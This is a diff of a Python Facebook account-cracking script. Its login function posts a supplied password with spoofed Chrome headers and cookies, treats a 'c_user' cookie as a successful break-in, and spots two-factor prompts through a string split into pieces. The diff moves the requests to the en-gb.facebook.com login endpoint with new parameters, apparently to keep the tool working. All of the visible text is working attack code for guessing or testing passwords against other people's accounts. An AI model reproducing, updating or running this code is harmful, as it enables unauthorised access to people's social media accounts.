@@ -1371,7 +1371,7 @@ def p(uid,pwx,tl):
             'first_prefill_type': 'password',
             'had_cp_prefilled': 'false',
             'had_password_prefilled': 'true',
-            'ab_test_data': '^%^2F^%^2FAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPf^%^2FfPAPPBFAC',
+            'ab_test_data': '/AAAAAAAAAAAAAAAAAAAA/AAAAAAAAAAAAAAAAAAAAKV/AVAKABFAG',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             cookies = {
             'sb': 'VHADZ6f33s9vZSib6xACAeH2',
@@ -1386,9 +1386,9 @@ def p(uid,pwx,tl):
             'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
             'dpr': '1',
-            'origin': 'https://www.facebook.com',
+            'origin': 'https://en-gb.facebook.com',
             'priority': 'u=0, i',
-            'referer': 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100&__mmr=1&_rdr',
+            'referer': 'https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100&__mmr=1&_rdr',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
             'sec-ch-ua-full-version-list': '"Google Chrome";v="131.0.6778.140", "Chromium";v="131.0.6778.140", "Not_A Brand";v="24.0.0.0"',
@@ -1404,7 +1404,7 @@ def p(uid,pwx,tl):
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
             'viewport-width': '885',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100'
+            url = 'https://en-gb.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
